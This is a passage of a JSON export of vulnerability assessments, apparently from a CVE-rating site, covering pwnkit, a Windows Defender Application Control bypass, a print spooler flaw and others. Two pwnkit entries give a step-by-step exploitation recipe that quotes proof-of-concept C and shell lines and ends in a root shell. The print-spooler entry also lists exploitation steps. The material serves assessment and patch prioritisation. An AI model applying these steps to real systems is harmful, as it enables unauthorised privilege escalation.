      "revisionDate": "2023-05-17T07:05:04.661693Z",
      "document": "## [CVE-2022-21906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21906)\r\n\r\n## [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-21906)\r\n\r\n## [Vendor](https://microsoft.com/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows10Exploits/master/2022/CVE-2022-21906/Docs/Windows%20Defender%20Application%20Control.png)\r\n\r\n## Description\r\nWindows Defender Application Control Security Feature Bypass Vulnerability.\r\nThe attacker can execute extremely dangerous apps by using different scenarios,\r\ndirectly from the user profile, without any reaction from the side of the Windows Defender.\r\nRead more: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21906\r\n\r\n## The latest version of Windows 10 Pro,  plus the latest update!\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows10Exploits/master/2022/CVE-2022-21906/Docs/version-latest-update.png)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows10Exploits/edit/master/2022/CVE-2022-21906)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2022/01/cve-2022-21906.html)\r\n\r\n## BugCheck after the exploit, the reaction of the kernel:\r\n\r\n- `BSOD.exe`\r\n\r\n```cmd\r\n1: kd> !analyze\r\n*******************************************************************************\r\n*                                                                             *\r\n*                        Bugcheck Analysis                                    *\r\n*                                                                             *\r\n*******************************************************************************\r\n\r\nUnknown bugcheck code (c0000022)\r\nUnknown bugcheck description\r\nArguments:\r\nArg1: 0000000000000000\r\nArg2: 0000000000000000\r\nArg3: 0000000000000000\r\nArg4: 0000000000000000\r\n\r\nDebugging Details:\r\n------------------\r\n\r\n\r\nERROR_CODE: (NTSTATUS) 0xc0000022 - {Access Denied}  A process has requested access to an object, but has not been granted those access rights.\r\n\r\nBUGCHECK_CODE:  c0000022\r\n\r\nBUGCHECK_P1: 0\r\n\r\nBUGCHECK_P2: 0\r\n\r\nBUGCHECK_P3: 0\r\n\r\nBUGCHECK_P4: 0\r\n\r\nPROCESS_NAME:  BSOD.exe\r\n\r\nSYMBOL_NAME:  nt!PopTransitionSystemPowerStateEx+1217\r\n\r\nMODULE_NAME: nt\r\n\r\nIMAGE_NAME:  ntkrnlmp.exe\r\n\r\nFAILURE_BUCKET_ID:  STATUS_ACCESS_DENIED_nt!PopTransitionSystemPowerStateEx\r\n\r\nFAILURE_ID_HASH:  {7fcb0a96-b639-2e09-82d6-2eef48bdcdea}\r\n\r\nFollowup:     MachineOwner\r\n---------\r\n```\r\n\r\n- `malicious.exe`\r\n\r\n```cmd\r\n0: kd> !analyze\r\n*******************************************************************************\r\n*                                                                             *\r\n*                        Bugcheck Analysis                                    *\r\n*                                                                             *\r\n*******************************************************************************\r\n\r\nUnknown bugcheck code (c0000022)\r\nUnknown bugcheck description\r\nArguments:\r\nArg1: 0000000000000000\r\nArg2: 0000000000000000\r\nArg3: 0000000000000000\r\nArg4: 0000000000000000\r\n\r\nDebugging Details:\r\n------------------\r\n\r\n\r\nERROR_CODE: (NTSTATUS) 0xc0000022 - {Access Denied}  A process has requested access to an object, but has not been granted those access rights.\r\n\r\nBUGCHECK_CODE:  c0000022\r\n\r\nBUGCHECK_P1: 0\r\n\r\nBUGCHECK_P2: 0\r\n\r\nBUGCHECK_P3: 0\r\n\r\nBUGCHECK_P4: 0\r\n\r\nPROCESS_NAME:  malicious.exe\r\n\r\nSYMBOL_NAME:  nt!PopTransitionSystemPowerStateEx+1217\r\n\r\nMODULE_NAME: nt\r\n\r\nIMAGE_NAME:  ntkrnlmp.exe\r\n\r\nFAILURE_BUCKET_ID:  STATUS_ACCESS_DENIED_nt!PopTransitionSystemPowerStateEx\r\n\r\nFAILURE_ID_HASH:  {7fcb0a96-b639-2e09-82d6-2eef48bdcdea}\r\n\r\nFollowup:     MachineOwner\r\n---------\r\n```\r\n## BR \r\nnu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cc054ae7-90d4-41ad-865f-79283bd58099",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "cc655532-ee0b-4bc3-8d1e-df9e5b7abfd4",
      "created": "2022-01-26T18:12:24.522208Z",
      "revisionDate": "2023-05-17T08:23:36.600983Z",
      "document": "## [CVE-NU11-2021-1101](https://www.sourcecodester.com/php/15018/online-payment-hub-using-php-and-paypal-free-source-code.html)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/oretnom23/CVE-NU11-2021-1101/docs/Screenshot%202021-11-01%20160624.png)\r\n\r\n## Description:\r\nThe OPH - PHP (by: oretnom23 ) v1.0 is vulnerable to remote SQL-Injection-Bypass-Authentication and PHPSESSID Hijacking. \r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of these accounts.\r\nAlso, the attacker can use PHPSSESSID to steal the session to the admin account. Disaster, online payment system WTF.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-NU11-2021-1101)\r\n\r\n## Proof\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-nu11-2021-1101-discovered-by.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ac90a152-8a13-43a9-afc8-da4d83d0018e",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "21ad0a36-a0aa-486b-a379-b47156286e9e",
      "created": "2022-01-27T20:45:21.76806Z",
      "revisionDate": "2022-01-27T20:45:21.767493Z",
      "document": "An improper input validation vulnerability exists within Solarwinds Serv-U 15.2.3 Hotfix1. Exploit code is not publicly available.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": []
    },
    {
      "id": "47817629-ddc5-49fe-80c9-53a394ce888a",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "f75aa31e-da06-433b-8539-82bffa1032ff",
      "created": "2022-02-01T21:53:03.899093Z",
      "revisionDate": "2022-02-23T19:31:23.450198Z",
      "document": "## Overview\r\n[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) is a local privilege escalation vulnerability affecting the [pkexec](https://linux.die.net/man/1/pkexec) utility commonly found on Linux distributions. The vulnerability was discovered by [Qualys](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) and given the nickname of `pwnkit`. The vulnerability was disclosed on January 25, 2022. \r\n\r\nExploitation of the vulnerability allows a low privileged user to escalate to `root`. While there are many such vulnerabilities published every year, this one is especially interesting because exploitation is trivial, the utility is ubiquitous, and the vulnerability has [reportedly](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) existed in the software all the way back to 2009. \r\n\r\nThis is an excellent finding and a useful exploit. However, as a general reminder, an attacker that has sufficient access to exploit this vulnerability is an attacker *already in your system*. Remediating this issue should be on your TODO list, but things aren't on fire here.\r\n\r\n## Exploitation\r\n\r\nThere are a number of proof of concept exploits floating around. I like [arthepsy's](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) best, because it's self-contained and concise. These are the two most critical lines:\r\n\r\n```C\r\nchar *env[] = { \"pwnkit\", \"PATH=GCONV_PATH=.\", \"CHARSET=PWNKIT\", \"SHELL=pwnkit\", NULL };\r\nexecve(\"/usr/bin/pkexec\", (char*[]){NULL}, env);\r\n```\r\n\r\nThe vulnerability is the result of how `pkexec` handles a `NULL` argument array. Above, you can see that `pkexec` is invoked with that exact condition. The `argv[]` parameter is set to `NULL` when calling [execve](https://man7.org/linux/man-pages/man2/execve.2.html). As described in Qualys' excellent writeup, an arbitrary environment valuable can be added into `pkexec`'s environment if `execve`'s `env[0]`exists in the directory within the the `PATH` variable in `env[1]`.\r\n\r\nFor the exploit to work in the `execve` above, `pwnkit` must exist in `./GCONV_PATH=./`. Looking at the proof of concept, you can see this is configured on the very first line via a `system` call:\r\n\r\n```C\r\nsystem(\"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'\");\r\n```\r\n\r\nNote that, `GCONV_PATH` is not the only environment variable that could be used here, but it's the one outlined in Qualy's writeup and works quite well. `GCONV_PATH` specific exploitation requires an the attacker also define a CHARSET variable. The `CHARSET` value can be whatever, but the attacker must make an `env[0]` directory that contains a `gconv-modules` file pointing to `env[0]` (which will be found via `PATH`). For example, the exploit we are referencing uses `CHARSET=PWNKIT` so it has to create this file structure:\r\n\r\n```C\r\nsystem(\"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules\");\r\n```\r\n\r\nIf the proof of concept used `CHARSET=cheesedoodle` then it would have to do this:\r\n\r\n```C\r\nsystem(\"mkdir -p pwnkit; echo 'module UTF-8// cheesedoodle// pwnkit 2' > pwnkit/gconv-modules\");\r\n```\r\n\r\nNote that the \"`cheesedoodle// pwnkit`\" describes the defined `CHARSET` and the implementing shared object. If the shared object was `/tmp/pwnkit.so` then this would be \"`cheesedoodle// /tmp/pwnkit`\".\r\n\r\nThe only thing left to do is to create the shared object that `pkexec` will load when it attempts to print. The reference proof of concept simply writes some C code to a file and then shells out to gcc to compile it.\r\n\r\n```C\r\nsystem(\"gcc pwnkit/pwnkit.c -o /tmp/pwnkit.so -shared -fPIC\");\r\n```\r\n\r\nWhich is fine. Not all systems will have `gcc` installed, but good enough.  The only major thing that I need to point out about the C code is that it needs to `setuid(0)`/ `setgid(0)`, otherwise it'll be executing as the normal user.\r\n\r\nFinally, the proof of concept also has a `SHELL` environment value set, but that can be set to anything invalid. For example, `SHELL=a` works fine. Otherwise the PoC works as advertised:\r\n\r\n```sh\r\nalbinolobster@ubuntu:~/pwnkit$ gcc -o poc poc.c\r\nalbinolobster@ubuntu:~/pwnkit$ ./poc \r\n# uname -a\r\nLinux ubuntu 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\r\n# whoami\r\nroot\r\n```\r\n\r\n## Other notes\r\n\r\nThere has been discussion that exploits should set the `GIO_USE_VFS` environment variable within their exploit. I haven't run into this myself (nor tested it), but GitHub user [v-rzh](https://github.com/v-rzh) explains [here](https://github.com/v-rzh/CVE-2021-4034/blob/master/README.md#whats-the-deal-with-gio_use_vfs). The basic summary is that for some versions of `pkexec` the environment array will get reallocated before the attacker can write into it unless the following has been set.\r\n\r\n```C\r\nsetenv (\"GIO_USE_VFS\", \"local\", 1);\r\n```\r\n\r\n## Useful Links\r\n* https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\r\n* https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034\r\n* https://github.com/v-rzh/CVE-2021-4034/blob/master/README.md#whats-the-deal-with-gio_use_vfs\r\n* https://linux.die.net/man/1/pkexec\r\n",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "0613eb85-bb6a-4cdd-a2a4-31b9bb4a441e",
      "editorId": "8a71fd53-6ac3-4c2b-a835-6ce3273eb01d",
      "topicId": "cbf7c2c4-17b9-46e9-ade8-64190c6e9f7d",
      "created": "2022-02-05T18:01:17.767433Z",
      "revisionDate": "2022-02-05T18:01:17.766745Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6081e722-fa08-445d-b20c-2613fc650fcb",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "4e2cfb2c-fec5-4fe5-8f78-75ade07dcf54",
      "created": "2022-02-11T17:54:41.660036Z",
      "revisionDate": "2022-02-14T11:54:32.169619Z",
      "document": "CVE-2021-1585 is an unpatched vulnerability that allows a man-in-the-middle or evil endpoint execute code on the victim's system. See the Rapid7 analysis for additional details.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "5490fa08-4b2e-48d8-977b-bc381818f0ca",
      "editorId": "5b9afbc1-16ec-4b23-a5ff-ab98d7830129",
      "topicId": "dee6ba54-6f2d-4a58-9654-b21dd42e3502",
      "created": "2022-02-15T08:23:14.821398Z",
      "revisionDate": "2022-02-15T08:23:14.821717Z",
      "document": "Google is aware of reports that an exploit for CVE-2022-0609 exists in the wild.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "22d8bf92-2505-4cac-80eb-b3c998ae59e6",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "f75aa31e-da06-433b-8539-82bffa1032ff",
      "created": "2022-02-22T23:40:43.35803Z",
      "revisionDate": "2022-02-23T15:38:15.570364Z",
      "document": "Polkit's pkexec binary is a bit like sudo in that it allows users to run an application as another user.\r\nFor instance, when you run something like `pkexec ls` you'll be prompted for the root user's password.\r\nBecause it allows elevated launching of programs, pkexec runs as root.\r\n\r\nProcesses that run like this are considered special and are run in a Secure-execution mode, which causes\r\nthe dynamic linker (ld.so) to strip out problematic environment variables that could introduce security\r\nconcerns.  One of these \"untrusted\" environment variables stripped out by the linker is `GCONV_PATH`, which\r\nsets the location for text conversion libraries.  If a binary needs to convert a text string to a different\r\nencoding, it will load/execute the library specified by `GCONV_PATH`.\r\n\r\nFor example, if we could get pkexec to run with the environment string `GCONV_PATH=./exploit`, pkexec would\r\nload and execute the exploit as root if we were able to coerce the binary to use an unknown charset.  This\r\nis why the dynamic linker prevents such an environment variable from being passed into secure-execution mode\r\nbinaries.\r\n\r\nThe check to prevent `GCONV_PATH` environment variables is done when a program loads, so if we can modify\r\nthe environment variables after the program loads, we could add it, but as the process runs as root, we\r\ncould not change those values ourselves.\r\n\r\nThis is where the logic flaw in pkexec can be abused.  pkexec runs through each argument it is passed and\r\ncalls `g_find_program_in_path` which takes a filename and replaces the filename with the full path to the\r\nfile, according to its `PATH` environment.  Since there can be multiple binaries, this is done within a\r\nloop.  The specific bug in pkexec is that the loop will always run at least once, even if the number of\r\narguments is 0.\r\n\r\nIf the number of arguments is 0, then it will still attempt to resolve the element it pulls from memory\r\nat the location the first argument would have been located.  Because of how the stack is structured,\r\nenvironment variables are located right after argument values in memory, so if there are no argument values,\r\nthen the environment values are there.  The exploit works by coercing `g_find_program_in_path` into\r\nwriting `GCONV_PATH=./exploit` into the first slot in the environment list.\r\n\r\nWe can do this by creating a folder in the `PATH` called `GCONV_PATH=.` and within that folder, place a \r\nfile named `abc`.  We also add the directory `GCONV_PATH` to the `PATH` environment variable.  Now, when\r\nwe launch pkexec without any arguments, but with `abc` as the first environment variable and `PATH=GCONV_PATH=`\r\nas the second, `g_find_program_in_path` will look for `abc` in the folder `GCONV_PATH=.` and find it.\r\nIt will then overwrite the first environment variable with the full path to the file as it exists in\r\nour PATH: `GCONV_PATH=./abc` or exactly what we'd like to have as our environment variable.\r\nNow, if we can coerce pkexec to use an unknown charset, it will load the library `./abc.so` which we'll make\r\nthe name of our payload.\r\n\r\nWe can coerce the loading of the .so by adding another environment variable declaring some unknown\r\ncharset: `CHARSET=garbage` would work fine if we could get pkexec to need to write a log.  We can \r\nget it to write a log by giving a bad value for something it depends on.  In our case, we're using\r\nthe `SHELL` environment variable.\r\n\r\nSo, to sum up, if we give pkexec a bad value for the `SHELL` environment variable and an unknown charset\r\nto encode, it will load the .so file specified by `GCONV_PATH` and run it as root in an attempt to\r\nencode to the unknown charset.\r\n\r\nTo break it down, we need to place a .so payload binary in our current working directory called \r\n`abc.so` and call pkexec with no arguments and the environment values:\r\n`abc`\r\n`PATH=GCONV_PATH=.`\r\n`SHELL=/garbage`\r\n`CHARSET=garbage`\r\n\r\nOnce `g_find_program_in_path` runs, the environment variables will be changed to:\r\n`GCONV_PATH=./abc.so`\r\n`PATH=GCONV_PATH=.`\r\n`SHELL=/garbage`\r\n`CHARSET=garbage`\r\n\r\nThe result will be that pkexec errors while trying to encode test to the non-existant charset, causing it to\r\nload the provided abc.so file in the root context.\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "61c5668f-7ea0-4c65-a810-6c1af7ed1149",
      "editorId": "55b930d2-4066-4c4d-8927-b2d2661dccca",
      "topicId": "f75aa31e-da06-433b-8539-82bffa1032ff",
      "created": "2022-02-23T21:36:55.656756Z",
      "revisionDate": "2022-02-23T21:51:18.211742Z",
      "document": "This script uses your apt cache to find the current installed version of polkit and compare it to the patched version according to your distribution:\r\n\r\nhttps://www.cyberark.com/resources/threat-research/checking-for-vulnerable-systems-for-cve-2021-4034-with-pwnkit-hunter",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "c20645b1-e616-4856-8dea-ae20dadfee10",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "5302a2db-c981-4555-9d78-3f6e0ec1d25e",
      "created": "2022-03-06T20:11:56.189218Z",
      "revisionDate": "2022-03-06T20:11:56.188064Z",
      "document": "I found many many servers, during penetration testing, on corporate environment that have an integrated HPE iLO 4.\r\nIt seems the default version of the firmware shipped with the server is 2.50 which make it vulnerable by default because it's rarely patched.\r\nThen it's a mater of seconds to get an administrator account on the iLO.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "37133631-1280-4974-b8b5-82d4d3166dd0",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "4e502c55-e1b7-445e-b426-649c863c1b93",
      "created": "2022-03-07T17:13:01.311107Z",
      "revisionDate": "2022-03-07T17:13:01.310366Z",
      "document": "CVE-2020-11899 (one of the Ripple20 bugs) has now been reported as exploited in the wild as per https://www.cisa.gov/known-exploited-vulnerabilities-catalog, No evidence that other bugs have been exploited though as of the time of writing.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "66a2681f-26c6-4de9-bf36-aee92e843d08",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "300897ea-9c15-4fc4-9ede-d9ff9df626f6",
      "created": "2022-03-09T20:03:48.51512Z",
      "revisionDate": "2022-12-28T05:01:26.975844Z",
      "document": "IP restriction bypass via X-REAL-IP HTTP header then SSRF and RCE on admin route with LUA code executed via scripts",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "e979a11f-3dda-4502-a007-ed68ae038b06",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "a8748a25-a699-434e-b4df-e9dd0dca643f",
      "created": "2022-03-11T21:07:34.925222Z",
      "revisionDate": "2022-03-11T21:08:48.358745Z",
      "document": "This is a useful vulnerability; however, an existing session on the target is required, and escalation of privileges can sometimes depend on luck. To achieve the directory creation and ultimately the file write, one first needs to reinitialize the print spooler. There exists one [primitive](https://www.accenture.com/us-en/blogs/cyber-defense/discovering-exploiting-shutting-down-dangerous-windows-print-spooler-vulnerability) to do this using `SetPrinterDataEx()` and `AppVTerminator.dll` as a Point and Print dll, but it's limited to two uses because the print spooler will not automatically restart after two crashes. If the print spooler has reached its maximum number of restarts, then this exploit will only work by restarting the system completely, which is not particularly stealthy. Additionally, the previously-mentioned primitive is limited, as Windows 7 does not appear to have the `AppVTerminator` dll.\r\n\r\nAssuming that the attacker has a printer handle with the `PRINTER_ACCESS_ADMINISTER` privilege and the ability to restart the print spooler, this vulnerability is fairly easy to exploit. Create a temp directory, set the `SpoolDirectory` to the temp path with the version 4 directory appended (in UNC path form), create junction between the temp path and the printer driver directory, restart spooler, write malicious dll, then load the dll.\r\n\r\nI wouldn't call this the first priority in the list of vulnerabilities to patch mainly due to an existing session being a requirement and success potentially depending on a reboot, but it should certainly be patched.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "92ad00b6-a57a-4101-9954-2323c1f5acbc",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "8f39f2f7-90c2-4011-8d46-a680e6960df3",
      "created": "2022-03-12T22:31:36.345818Z",
      "revisionDate": "2022-03-12T22:31:36.344578Z",
